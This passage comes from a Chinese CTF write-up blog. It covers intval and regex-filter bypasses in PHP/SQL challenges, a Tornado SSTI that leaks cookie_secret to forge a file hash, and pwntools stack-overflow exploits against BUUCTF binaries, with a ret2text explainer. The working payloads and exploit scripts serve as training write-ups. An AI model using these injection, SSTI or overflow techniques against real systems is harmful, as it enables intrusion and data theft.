data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>?></span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><p>参考<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNjE3MDM0L2FydGljbGUvZGV0YWlscy85NDA0MDIxMg=="> CG-CTF</span> 才知道这题考察的是 intval 漏洞，需要满足 id=1000，同时 intval ($id)&gt;999 要返回 false;</p>
<p><span class="purple">这里可以使用 '1000' 字符绕过，'1000' 进行 intval 后还是 1000 (&quot;1000&quot; 同理)</span></p>
<p><span class="pink">125&lt;&lt;3 也可以，而 8000&gt;&gt;3 却不行.</span></p>
<p><span class="green">当然可以使用 680|320 绕过</span></p>
<p><span class="aqua">也可以使用 hex (16 进制) 绕过：例如 0x3e8</span></p>
<p><img data-src="https://i.loli.net/2021/01/24/laVFmL2G8YTKjky.png" alt="" /></p>
<p>任意一种方法都可 get flag</p>
<h1 id="question2"><a class="anchor" href="#question2">#</a> Question2</h1>
<h2 id="源码-2"><a class="anchor" href="#源码-2">#</a> 源码</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="2"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="3"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="4"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="5"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="6"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num="7"></td><td><pre>    if(preg_match("/or|\+/i",$id))&#123;</pre></td></tr><tr><td data-num="8"></td><td><pre>            die("id error");</pre></td></tr><tr><td data-num="9"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="10"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="11"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="13"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="14"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="15"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="16"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="17"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="18"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="19"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="20"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="21"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="22"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="23"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="24"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="25"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="26"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="27"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="28"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="29"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="30"></td><td><pre>    </pre></td></tr><tr><td data-num="31"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="32"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="33"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="34"></td><td><pre></pre></td></tr><tr><td data-num="35"></td><td><pre>?></span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><div class="note info">
<p>keycode：</p>
</div>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>if(preg_match("/or|\+/i",$id))</pre></td></tr></table></figure><p>payload: 同样用 '1000' 绕过</p>
<h1 id="question3"><a class="anchor" href="#question3">#</a> Question3</h1>
<h2 id="源码-3"><a class="anchor" href="#源码-3">#</a> 源码</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="8"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="9"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="10"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="11"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num="13"></td><td><pre>    if(preg_match("/or|\-|\\|\*|\&lt;|\>|\!|x|hex|\+/i",$id))&#123;</pre></td></tr><tr><td data-num="14"></td><td><pre>            die("id error");</pre></td></tr><tr><td data-num="15"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="16"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="17"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="18"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="19"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="20"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="21"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="22"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="23"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="24"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="25"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="26"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="27"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="28"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="29"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="30"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="31"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="32"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="33"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="34"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="35"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="36"></td><td><pre>    </pre></td></tr><tr><td data-num="37"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="38"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="39"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>?></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><div class="note info">
<p>keycode:</p>
</div>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>if(preg_match("/or|\-|\\|\*|\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>|\</span><span class="token punctuation">></span></span>|\!|x|hex|\+/i",$id))</pre></td></tr></table></figure><p>同理</p>
<h1 id="question4"><a class="anchor" href="#question4">#</a> Question4</h1>
<h2 id="源码-4"><a class="anchor" href="#源码-4">#</a> 源码</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>ctf.show萌新计划web1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token prolog">&lt;?php</pre></td></tr><tr><td data-num="8"></td><td><pre># 包含数据库连接文件</pre></td></tr><tr><td data-num="9"></td><td><pre>include("config.php");</pre></td></tr><tr><td data-num="10"></td><td><pre># 判断get提交的参数id是否存在</pre></td></tr><tr><td data-num="11"></td><td><pre>if(isset($_GET['id']))&#123;</pre></td></tr><tr><td data-num="12"></td><td><pre>        $id = $_GET['id'];</pre></td></tr><tr><td data-num="13"></td><td><pre>    if(preg_match("/or|\-|\\\|\/|\\*|\&lt;|\>|\!|x|hex|\(|\)|\+|select/i",$id))&#123;</pre></td></tr><tr><td data-num="14"></td><td><pre>            die("id error");</pre></td></tr><tr><td data-num="15"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="16"></td><td><pre>    # 判断id的值是否大于999</pre></td></tr><tr><td data-num="17"></td><td><pre>    if(intval($id) > 999)&#123;</pre></td></tr><tr><td data-num="18"></td><td><pre>        # id 大于 999 直接退出并返回错误</pre></td></tr><tr><td data-num="19"></td><td><pre>        die("id error");</pre></td></tr><tr><td data-num="20"></td><td><pre>    &#125;else&#123;</pre></td></tr><tr><td data-num="21"></td><td><pre>        # id 小于 999 拼接sql语句</pre></td></tr><tr><td data-num="22"></td><td><pre>        $sql = "select * from article where id = $id order by id limit 1 ";</pre></td></tr><tr><td data-num="23"></td><td><pre>        echo "执行的sql为：$sql&lt;br>";</pre></td></tr><tr><td data-num="24"></td><td><pre>        # 执行sql 语句</pre></td></tr><tr><td data-num="25"></td><td><pre>        $result = $conn->query($sql);</pre></td></tr><tr><td data-num="26"></td><td><pre>        # 判断有没有查询结果</pre></td></tr><tr><td data-num="27"></td><td><pre>        if ($result->num_rows > 0) &#123;</pre></td></tr><tr><td data-num="28"></td><td><pre>            # 如果有结果，获取结果对象的值$row</pre></td></tr><tr><td data-num="29"></td><td><pre>            while($row = $result->fetch_assoc()) &#123;</pre></td></tr><tr><td data-num="30"></td><td><pre>                echo "id: " . $row["id"]. " - title: " . $row["title"]. " &lt;br>&lt;hr>" . $row["content"]. "&lt;br>";</pre></td></tr><tr><td data-num="31"></td><td><pre>            &#125;</pre></td></tr><tr><td data-num="32"></td><td><pre>        &#125;</pre></td></tr><tr><td data-num="33"></td><td><pre>        # 关闭数据库连接</pre></td></tr><tr><td data-num="34"></td><td><pre>        $conn->close();</pre></td></tr><tr><td data-num="35"></td><td><pre>    &#125;</pre></td></tr><tr><td data-num="36"></td><td><pre>    </pre></td></tr><tr><td data-num="37"></td><td><pre>&#125;else&#123;</pre></td></tr><tr><td data-num="38"></td><td><pre>    highlight_file(__FILE__);</pre></td></tr><tr><td data-num="39"></td><td><pre>&#125;</pre></td></tr><tr><td data-num="40"></td><td><pre></pre></td></tr><tr><td data-num="41"></td><td><pre>?></span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token comment">&lt;!-- flag in id = 1000 --></span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></pre></td></tr></table></figure><div class="note info">
<p>keycode:</p>
</div>
<p>&lt;pre&gt;&lt;code&gt;<br />
if(preg_match(&quot;/or|-|\|/|\*|&lt;|&gt;|!|x|hex|(|)|+|select/i&quot;,$id))<br />
&lt;/code&gt;&lt;/pre&gt;</p>
<p>payload: 使用 '1000'</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>SQL绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>Easy_Tornado</title>
    <url>/easy-tornado/</url>
    <content><![CDATA[<p>Tornado：python 编写的 web 服务器兼 web 应用框架<br />
<a id="more"></a><br />
 打开靶机发现有三个文件</p>
<p><img data-src="https://i.loli.net/2021/08/17/kV1wbxNCMXKIO8F.png" alt="" /></p>
<h3 id="flagtxt"><a class="anchor" href="#flagtxt">#</a> flag.txt</h3>
<p><img data-src="https://i.loli.net/2021/08/17/synaCjq8xuZloKz.png" alt="" /></p>
<h3 id="welcometxt"><a class="anchor" href="#welcometxt">#</a> welcome.txt</h3>
<p><img data-src="https://i.loli.net/2021/08/17/emcAdbEFXkC6w71.png" alt="" /></p>
<p><span class="green">render</span> 是 python 中的一个渲染函数 渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p>
<ol>
<li>render 方法的实质就是生成 template 模板；</li>
<li>通过调用一个方法来生成，而这个方法是通过 render 方法的参数传递给它的；</li>
<li>这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的 html 内容</li>
<li>通过这三个参数，可以生成一个完整的木模板</li>
</ol>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxNzg4Mjc1MzQvYXJ0aWNsZS9kZXRhaWxzLzgwNzkyNTE0">render 函数介绍</span><br />
<span class="exturl" data-url="aHR0cHM6Ly93d3cua2FuY2xvdWQuY24va2FuY2xvdWQvcHl0aG9uLWJhc2ljLzQxNzEy">模板 self.render</span></p>
<h3 id="hintstxt"><a class="anchor" href="#hintstxt">#</a> hints.txt</h3>
<p><img data-src="https://i.loli.net/2021/08/17/Az9GROsw2kftaC3.png" alt="" /></p>
<h3 id="get-cookie_secret"><a class="anchor" href="#get-cookie_secret">#</a> Get cookie_secret</h3>
<p>由 flag.txt 知 filename=/fllllllllllllag，现在只要知道 cookie_secret 是多少就能写 payload 拿取 flag.</p>
<p>由已知 3 个文件格式推测 payload 格式可能为</p>
<p>file?filename=/fllllllllllllag&amp;filehash=xxxxxxx</p>
<p>我先随便输入一个尝试一下，测试完后发现有 error 界面，还有 /error?msg=Error</p>
<p><img data-src="https://i.loli.net/2021/08/17/zDTuoICG6twxUep.png" alt="" /></p>
<p>见识不够，看了 wp 知道是服务端模板注入攻击 SSTI</p>
<pre><code>/error?msg=&#123;&#123;23333&#125;&#125;
</code></pre>
<p><img data-src="https://i.loli.net/2021/08/17/MDNxlvw6S5CcaT3.png" alt="" /><br />
界面回显也是 23333. 那肯定是要我们在双括号中键入什么了</p>
<p>之前遇见过一次 SSTI 所以知道双括号应该是固定的写法，但至于为什么没有深究，在<span class="exturl" data-url="aHR0cHM6Ly93d3cudG9ybmFkb3dlYi5vcmcvZW4vbGF0ZXN0L3RlbXBsYXRlLmh0bWw="> Tornado 官方文档</span>中看到<br />
模板表达式被双花括号包围；内容可以是任何 python 表达式，它将根据当前的自动转义设置进行转义并插入到输出中。其他模板指令使用.</p>
<pre><code>&#123;&#123; ... &#125;&#125;&#123;% %&#125;&#123;# ... #&#125;（jinjia2语法）
</code></pre>
<p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，</p>
<pre><code>即：&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123;&#125;&#125;包裹的内容当做变量解析替换。比如&#123;&#123;1+1&#125;&#125;会被解析成2.因此才有了现在的模板注入漏洞.类似于SQL注入的漏洞
</code></pre>
<p>关于 SSTI 引发的真正原因是：render_template 渲染函数的问题</p>
<p>cookie_secret 在 Application 对象 settings 属性中 另外 self.application.settings 有一个别名</p>
<pre><code>RequestHandler.settings

An alias for self.application.settings.
</code></pre>
<p><img data-src="https://i.loli.net/2021/08/17/pmKweW9VqLl2hG5.png" alt="" /></p>
<p>handler 指向 RequestHandler (封装对请求处理的所有信息和处理方法)</p>
<p>而 RequestHandler.settings 又指向 self.application.settings</p>
<p>于是所有 handler.settings 就指向 RequestHandler.application.settings 了！</p>
<pre><code>/error?msg=&#123;&#123;handler.settings&#125;&#125;
</code></pre>
<p><img data-src="https://i.loli.net/2021/08/17/74VYO3Sni9g8wjJ.png" alt="" /></p>
<p>得到 cookie_secret:036cc74f-81bc-4583-9f02-e7cdb12cfa7c</p>
<h3 id="编写python脚本计算filehash值"><a class="anchor" href="#编写python脚本计算filehash值">#</a> 编写 python 脚本计算 filehash 值</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> hashlib</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>	md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>	<span class="token keyword">return</span> md5</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">def</span> <span class="token function">filehash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>	filename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span></pre></td></tr><tr><td data-num="9"></td><td><pre>	cookie_secret <span class="token operator">=</span> <span class="token string">'036cc74f-81bc-4583-9f02-e7cdb12cfa7c'</span></pre></td></tr><tr><td data-num="10"></td><td><pre>	<span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>	filehash<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>filehash=bd130d4511c341d7397c50a7f1f10c77</p>
<p>payload</p>
<pre><code>file?filename=/fllllllllllllag&amp;filehash=bd130d4511c341d7397c50a7f1f10c77
</code></pre>
<p><img data-src="https://i.loli.net/2021/08/17/HCf6wXzMm1a4vE3.png" alt="" /></p>
<p>得到 flag</p>
]]></content>
      <categories>
        <category>wp</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>砰！</title>
    <url>/pwn/</url>
    <content><![CDATA[<p>放假在家准备接触一下从未挑战过的 pwn<br />
<a id="more"></a></p>
<h1 id="pwn1_sctf_2016"><a class="anchor" href="#pwn1_sctf_2016">#</a> pwn1_sctf_2016</h1>
<h2 id="download文件后checksec"><a class="anchor" href="#download文件后checksec">#</a> Download 文件后 checksec</h2>
<p><img data-src="https://i.loli.net/2021/01/26/7j8JaB9lHnkAOEz.png" alt="" /></p>
<p>地址在哪已经显而易见了，接着我们 IDA 静态分析一下；</p>
<h2 id="找到漏洞函数"><a class="anchor" href="#找到漏洞函数">#</a> 找到漏洞函数</h2>
<p><img data-src="https://i.loli.net/2021/01/26/bWcCqv3JaAkjKLM.png" alt="" /></p>
<p>s 的长度为 60, 而我们只能够输入 32 个字符，不足以栈溢出；<br />
 但是 replace 函数会把我们输入的 I 替换成 you,I 是一个字符，you 是三个字符，这样输入 20 个 I 既不会超过 32 字符限制，最终替换成 60 个字符也能够填满 s.</p>
<h3 id="找到后门函数08048f0d"><a class="anchor" href="#找到后门函数08048f0d">#</a> 找到后门函数：08048F0D</h3>
<p><img data-src="https://i.loli.net/2021/01/26/IFjYROyJEVHSNhx.png" alt="" /></p>
<div class="note info">
<p>exp:</p>
</div>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">27833</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'I'</span><span class="token operator">*</span><span class="token number">20</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>执行结果:</p>
<p><img data-src="https://i.loli.net/2021/01/26/Udh2q8TIw3DECvR.png" alt="" /></p>
<p class="bulr">拿到 flag:<br />
!<span class="spoiler" title="快走开(╯▔皿▔)╯">flag{5e9a24f6-ddb2-4237-b3e0-6d968c34cec8}</span>!</p>
<h1 id="warmup_csaw_2016"><a class="anchor" href="#warmup_csaw_2016">#</a> warmup_csaw_2016</h1>
<p>拖入 IDA F5</p>
<p><img data-src="https://i.loli.net/2021/01/26/yY1db59ZflEcagC.png" alt="" /></p>
<p>发现要求输入 v5 自变量；</p>
<p><img data-src="https://i.loli.net/2021/01/26/BNTLOps68XFk7Ht.png" alt="" /></p>
<p>v5 的可用栈大小为 0x40<br />
 可以看出，这个 gets 绝对有问题；</p>
<p>程序存在后门:</p>
<p><img data-src="https://i.loli.net/2021/01/26/OR51iljEJaZWY7p.png" alt="" /></p>
<p>sub_40060D 的地址为 0x40060D</p>
<p>下面我们可以写个脚本跑出 flag;<br />
 在此之前我们知道 v5 的栈大小为 0x40, 但还需要加上返回值的 8 个字符；<br />
 最终为 0x48.</p>
<div class="note info">
<p>构造 exp</p>
</div>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span></pre></td></tr><tr><td data-num="2"></td><td><pre>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node3.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">28395</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x40060D</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/01/26/SrE8Q7LZpRatNkH.png" alt="" /></p>
<p>得到 flag:</p>
<p class="bulr"><span class="spoiler" title="快走开(╯▔皿▔)╯">flag{a15dd406-0d79-4f49-b5a0-3dde546a4d3d}</span></p>
]]></content>
      <categories>
        <category>wp</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>ret2text</title>
    <url>/ret2text/</url>
    <content><![CDATA[<p><a id="more"></a></p>
<h2 id="检查保护机制"><a class="anchor" href="#检查保护机制">#</a> 检查保护机制</h2>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>checksec ret2text</pre></td></tr></table></figure><figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>Arch:    i386-32-little //文件为32位程序</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>RELRO:    Partial RELRO</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>Stack:    No canary found    //未开启canary保护</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>NX:      NX enabled    //开启了栈不可执行保护</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>PIE:      No PIE (0x8048000)    //未开启地址无关可执行</pre></td></tr></table></figure><p><img data-src="https://i.loli.net/2021/07/17/Iz1T5jnZ4NKvmPU.png" alt="22508867-848911d41f68e4a3.png" /></p>
<h3 id="canary栈保护"><a class="anchor" href="#canary栈保护">#</a> canary（栈保护)</h3>
<p>当启用栈保护后，函数开始执行的时候会先往栈底插入 cookie 信息，当函数真正返回的时候会验证 cookie 信息是否合法 (栈帧销毁前测试该值是否被改变);<br />
 如果不合法就停止程序运行 (栈溢出发生)。<br />
攻击者在覆盖返回地址的时候往往也会将 cookie 信息给覆盖掉，导致栈保护检查失败而阻止 shellcode 的执行，避免漏洞利用成功。在 Linux 中我们将 cookie 信息称为 Canary。</p>
<h3 id="pie"><a class="anchor" href="#pie">#</a> PIE</h3>
<p>如果程序开启了 PIE 保护的话，在每次加载程序时都变换加载地址</p>
<h3 id="nxdep"><a class="anchor" href="#nxdep">#</a> NX(DEP)</h3>
<p>NX 即 No-eXecute（不可执行）的意思，限制一块内存区域不可执行。</p>
<h3 id="aslr"><a class="anchor" href="#aslr">#</a> ASLR</h3>
<p>ASLR（地址随机化）是一种针对缓冲区溢出的安全保护技术，通过对堆、栈、共享库映射等线性区布局的随机化，通过增加攻击者预测目的地址的难度，防止攻击者直接定位攻击代码位置，达到阻止溢出攻击的目的。</p>
<h2 id="0x2"><a class="anchor" href="#0x2">#</a> 0x2</h2>
<p>本题是 32 位程序，对应的是 32 的 IDA。加载出来的是汇编语言，然后就要去看它的 main 函数按 F5 反汇编</p>
<p><img data-src="https://i.loli.net/2021/07/17/mazEnNbs1OG9At4.png" alt="22508867-2c22be6edd039812.png" title="这里存在栈溢出漏洞" /></p>
<h3 id="栈溢出漏洞"><a class="anchor" href="#栈溢出漏洞">#</a> 栈溢出漏洞</h3>
<p>简单讲，栈溢出就是向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，造成溢出。</p>
